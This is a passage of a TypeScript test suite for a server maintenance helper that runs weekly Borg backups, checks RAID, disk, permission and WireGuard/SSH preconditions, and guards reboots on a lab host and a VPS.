      "vorlauf-20260901T010000Z-a", "woche-20260913T033000Z", "woche-20260920T033000Z", "vorlauf-20260902T010000Z-b", "vorlauf-20260903T010000Z-c",
      expect.stringMatching(/^woche-\d{8}T\d{6}Z$/),
    ]);
    // No host run was started for it.
    expect(existsSync(path.join(dir, "units.log"))).toBe(false);
  });

  it.each([
    ["outside its unit", () => {}, { COCKPIT_SYSTEM_BACKUP_IN_UNIT: "" }, 64, "only inside cockpit-systemsicherung.service"],
    ["on a host with the VPS net", () => writeNet({ version: "cockpit-host-run-net/v1", net: "hoster-snapshot" }), undefined, 78, "the timer belongs only on a host with net system-backup"],
    ["with a broken configuration", () => writeNet({ ...lab0Net(), keep: 3 }), undefined, 78, "unknown field keep"],
    ["on a degraded RAID", () => writeFileSync(path.join(dir, "mdstat"), "md0 : active raid5 sdc1[2] sdb1[1] sda1[0]\n      2929890816 blocks [4/3] [UUU_]\n"), undefined, 70, "degraded [4/3] [UUU_]"],
    ["with a halted retention service", () => writeFileSync(path.join(dir, "retention-halted"), ""), undefined, 70, "halted after an anomaly"],
  ])("does not make the weekly backup %s", (_label, arrange, extra, code, message) => {
    arrange();
    const out = weekly(extra);
    expect(out.code).toBe(code);
    expect(out.stderr).toContain(message);
    expect(borgCalls("create")).toEqual([]);
  });

  it("does not back up into a running host run", () => {
    expect(run(["start"], request(manifest({ steps: [{ name: "reboot", reboot: true }] }))).code).toBe(0);
    expect(status().state.phase).toBe("rebooting");
    const out = weekly();
    expect(out.code).toBe(75);
    expect(out.stderr).toContain("host run job-1 is active");
    expect(borgCalls("create")).toHaveLength(1);
  });

  it("does not start a host run while the weekly backup runs", () => {
    const out = run(["start"], request(manifest()), { STUB_UNIT_STATE: "active" });
    expect(out.code).toBe(75);
    expect(out.stderr).toContain("the weekly system backup is running");
    expect(borgCalls()).toEqual([]);
    // The start lock is released: the next start goes through.
    expect(existsSync(path.join(dir, "runs", ".start.lock"))).toBe(false);
  });

  it("ships the weekly timer for Lab0: the helper's verb in its own unit, weekly, catching up after boot", () => {
    const unit = (name: string) => readFileSync(fileURLToPath(new URL(`../../../deploy/systemd/${name}`, import.meta.url)), "utf8");
    const service = unit("cockpit-systemsicherung.service");
    expect(service).toMatch(/^ExecStart=\/opt\/node-v20\.19\.1-linux-x64\/bin\/node \/usr\/local\/lib\/wireguard-ops-cockpit\/cockpit-host-run\.mjs weekly-backup$/m);
    expect(service).toMatch(/^Environment=COCKPIT_SYSTEM_BACKUP_IN_UNIT=1$/m);
    expect(service).toMatch(/^Type=oneshot$/m);
    expect(service).toMatch(/^RequiresMountsFor=\/media\/RAID$/m);
    const timer = unit("cockpit-systemsicherung.timer");
    expect(timer).toMatch(/^OnCalendar=Sun \*-\*-\* 03:30:00$/m);
    expect(timer).toMatch(/^Persistent=true$/m);
    expect(timer).toMatch(/^WantedBy=timers\.target$/m);
    // The VPS has no system backup: its deploy script does not install the timer.
    expect(readFileSync(fileURLToPath(new URL("../../../deploy/vps/vps-cockpit-deploy.sh", import.meta.url)), "utf8")).not.toContain("cockpit-systemsicherung");
  });

  it.each([
    ["a degraded RAID", () => writeFileSync(path.join(dir, "mdstat"), "md0 : active raid5 sdc1[2] sdb1[1] sda1[0]\n      2929890816 blocks [4/3] [UUU_]\n"), "degraded [4/3] [UUU_]"],
    ["a missing RAID", () => writeFileSync(path.join(dir, "mdstat"), "unused devices: <none>\n"), "RAID md0 is not in /proc/mdstat"],
    ["an unmounted backup disk", () => writeFileSync(path.join(dir, "mountinfo"), "26 1 253:0 / / rw - ext4 /dev/mapper/vg-root rw\n"), "is not mounted"],
    ["a backup disk on the root filesystem", () => writeFileSync(path.join(dir, "mountinfo"), `26 1 253:0 / / rw - ext4 /dev/x rw\n40 26 253:0 / ${raid} rw - ext4 /dev/x rw\n`), "same filesystem as /"],
    ["a halted retention service", () => writeFileSync(path.join(dir, "retention-halted"), ""), "halted after an anomaly (0123456789abcdef)"],
    ["too little space", () => writeNet(lab0Net({}, { reserveGB: 10000 })), "not enough space"],
    ["a missing source", () => writeNet(lab0Net({}, { sources: ["/proc", "/does-not-exist"] })), "backup source /does-not-exist does not exist"],
    ["a missing standalone borg", () => rmSync(path.join(dir, "borg-standalone")), "standalone borg binary"],
    ["a borg that is not 1.4", () => writeFileSync(path.join(dir, "borg-version"), "borg-standalone 1.2.8\n"), "is not borg 1.4.x (borg-standalone 1.2.8)"],
    ["a borg with a look-alike version", () => writeFileSync(path.join(dir, "borg-version"), "borg-standalone 1.40.1\n"), "is not borg 1.4.x (borg-standalone 1.40.1)"],
    ["a program that is not borg", () => writeFileSync(path.join(dir, "borg-version"), "restic 1.4.5\n"), "is not borg 1.4.x (restic 1.4.5)"],
    ["a borg others may write", () => chmodSync(path.join(dir, "borg-standalone"), 0o775), "not writable by group or others"],
    ["a missing emergency guide", () => rmSync(path.join(dir, "cockpit-systemsicherung-NOTFALL.txt")), "emergency guide"],
    ["a symlink as target", () => { mkdirSync(path.join(dir, "elsewhere")); symlinkSync(path.join(dir, "elsewhere"), target); }, "must be a directory owned by root"],
    ["a foreign directory as target", () => { mkdirSync(path.join(target, "borg"), { recursive: true }); }, "was not created by the host door; it is never taken over"],
    ["an old configuration with a single keep", () => writeNet({ ...lab0Net(), systemBackup: { ...lab0Net().systemBackup, keep: 3 } }), "unknown field keep"],
    ["an invalid configuration", () => writeNet({ ...lab0Net(), extra: true }), "unknown field extra"],
    ["a configuration others may write", () => writeNet(lab0Net(), 0o666), "owned by root and not writable"],
  ])("stops before any step on %s", (_label, arrange, message) => {
    arrange();
    run(["start"], request(manifest()));
    const { state } = status();
    expect(state.status).toBe("preflight_failed");
    expect(state.error).toContain(message);
    expect(state.error).toContain("nothing was executed");
    expect(existsSync(path.join(dir, "step-one"))).toBe(false);
    expect(borgCalls()).toEqual([]);
    expect(existsSync(path.join(dir, "snapshot.log"))).toBe(false);
  });

  it("passes Lab0's real RAID (IMSM raid10 md126) with the shipped configuration", () => {
    const shipped = JSON.parse(readFileSync(fileURLToPath(new URL("../../../deploy/config/host-run-net.lab0.json", import.meta.url)), "utf8"));
    writeNet(lab0Net({}, { raidDevice: shipped.systemBackup.raidDevice }));
    // As Lab0 shows it (test/cockpit-borg-action.test.sh): the volume md126 in the IMSM container md127.
    writeFileSync(path.join(dir, "mdstat"), [
      "Personalities : [raid10]",
      "md126 : active raid10 sda[4] sdb[2] sdc[1] sdd[0]",
      "      5860528128 blocks super external:/md127/0 64K chunks 2 near-copies [4/4] [UUUU]",
      "",
      "md127 : inactive sdd[3](S) sdc[2](S) sdb[1](S) sda[0](S)",
      "      20804 blocks super external:imsm",
      "",
    ].join("\n"));
    run(["start"], request(manifest()));
    expect(status().state.status).toBe("success");
    expect(status().logTail).toContain("RAID md126 [4/4] [UUUU]");
  });

  it("ends with a reason, not a crash, when the target is no directory", () => {
    writeFileSync(target, "not a directory");
    run(["start"], request(manifest()));
    const { state } = status();
    expect(state.status).toBe("preflight_failed");
    expect(state.error).toContain("must be a directory owned by root");
    expect(existsSync(path.join(dir, "step-one"))).toBe(false);
  });

  it("stops before any step when borg create fails", () => {
    writeFileSync(path.join(dir, "borg-create-rc"), "2");
    run(["start"], request(manifest()));
    const { state } = status();
    expect(state.status).toBe("preflight_failed");
    expect(state.error).toContain("borg exit 2");
    expect(existsSync(path.join(dir, "step-one"))).toBe(false);
    expect(borgCalls("prune")).toEqual([]);
  });

  it("accepts a borg warning (files changed while reading, exit 1)", () => {
    writeFileSync(path.join(dir, "borg-create-rc"), "1");
    run(["start"], request(manifest()));
    expect(status().state).toMatchObject({ status: "success", systemBackup: { borgExit: 1 } });
  });

  it("runs on with the complete archive when prune fails, and says so", () => {
    writeFileSync(path.join(dir, "borg-prune-rc"), "2");
    run(["start"], request(manifest()));
    const { state, logTail } = status();
    expect(state.status).toBe("success");
    expect(state.systemBackup.upkeepError).toBe("borg prune failed (exit 2)");
    expect(borgCalls("compact")).toEqual([]);
    expect(logTail).toContain("warning: borg prune failed (exit 2); the new archive is complete");
  });

  it("needs no net for a declared read-only run, even with a broken configuration", () => {
    writeNet({ version: "nope" });
    run(["start"], request(manifest({ mutates: false })));
    expect(status().state.status).toBe("success");
    expect(borgCalls()).toEqual([]);
  });

  it("says before a reboot that only someone on site helps, and checks WireGuard and SSH come back", () => {
    writeFileSync(path.join(dir, "disabled-ssh.service"), ""); // ssh.socket is enough
    run(["start"], request(manifest({ steps: [{ name: "reboot", reboot: true }, { name: "after", run: `touch ${dir}/after`, timeoutSeconds: 30 }],
      checks: [{ name: "after ran", run: `test -f ${dir}/after`, timeoutSeconds: 30 }] })));
    expect(status().state.phase).toBe("rebooting");
    expect(status().logTail).toContain("only someone on site can help");
    writeFileSync(path.join(dir, "boot_id"), "boot-b\n");
    run(["resume"]);
    expect(status().state.status).toBe("success");
    // One system backup for the whole run, not one per boot.
    expect(borgCalls("create")).toHaveLength(1);
  });

  it("does not start a run with a reboot when WireGuard would not come back", () => {
    writeFileSync(path.join(dir, "disabled-wg-quick@wg0.service"), "");
    run(["start"], request(manifest({ steps: [{ name: "one", run: `touch ${dir}/step-one`, timeoutSeconds: 30 }, { name: "reboot", reboot: true }] })));
    const { state } = status();
    expect(state.status).toBe("preflight_failed");
    expect(state.error).toContain("not enabled at boot");
    expect(state.error).toContain("wg-quick@wg0.service");
    expect(existsSync(path.join(dir, "step-one"))).toBe(false);
    expect(existsSync(path.join(dir, "reboot.log"))).toBe(false);
  });

  it("does not reboot when a step disabled SSH on the way, and names the archive as return path", () => {
    run(["start"], request(manifest({ steps: [
      { name: "upgrade", run: `touch ${dir}/disabled-ssh.service ${dir}/disabled-ssh.socket`, timeoutSeconds: 30 },
      { name: "reboot", reboot: true },
      { name: "never", run: `touch ${dir}/never`, timeoutSeconds: 30 },
    ] })));
    const { state, logTail } = status();
    expect(state.status).toBe("failed");
    expect(state.error).toContain("the host was not rebooted");
    expect(state.error).toContain("ssh.service or ssh.socket");
    expect(state.steps[1].status).toBe("failed");
    expect(existsSync(path.join(dir, "reboot.log"))).toBe(false);
    expect(existsSync(path.join(dir, "never"))).toBe(false);
    expect(logTail).toContain(`return path: system backup ${repo}::vorlauf-`);
    expect(logTail).toContain("NOTFALL.txt");
  });

  it("keeps the VPS net when the configuration says so, with the boot check on top", () => {
    writeNet({ version: "cockpit-host-run-net/v1", net: "hoster-snapshot", reboot: { mustBeEnabled: [["wg-quick@wg0.service"]] } });
    writeFileSync(path.join(dir, "disabled-wg-quick@wg0.service"), "");
    run(["start"], request(manifest({ steps: [{ name: "reboot", reboot: true }] })));
    expect(status().state.error).toContain("wg-quick@wg0.service");
    rmSync(path.join(dir, "disabled-wg-quick@wg0.service"));
    run(["start"], request(manifest(), {}, "job-2"));
    expect(status("job-2").state).toMatchObject({ status: "success", snapshot: { snapshotId: "snap-42" } });
    expect(borgCalls()).toEqual([]);
  });
});
